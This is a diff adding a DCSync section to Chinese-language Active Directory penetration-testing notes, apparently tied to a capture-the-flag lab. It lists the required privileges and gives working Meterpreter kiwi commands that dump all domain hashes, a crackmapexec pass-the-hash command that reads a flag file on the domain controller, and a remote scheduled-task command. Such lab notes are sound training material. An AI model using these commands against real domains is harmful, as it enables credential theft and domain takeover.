@@ -124,6 +124,23 @@ schtasks /create /S WIN-ENS2VR5TR3N /TN "test" /TR c:/1.bat /SC MINUTE /ST 21:27
 * 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
 * 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限
 
+### Dsync攻击 
+[Dsync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)
+
+DCSync攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：
+
+* Administrators组内的用户
+* Domain Admins组内的用户
+* Enterprise Admins组内的用户
+* 域控制器的计算机帐户
+* 即：默认情况下域管理员组具有该权限。
+```sh
+meterpreter > load kiwi
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
+# 拿到hash后 通过哈希传递 拿到域控
+proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
+
+```
 
 # Article
 
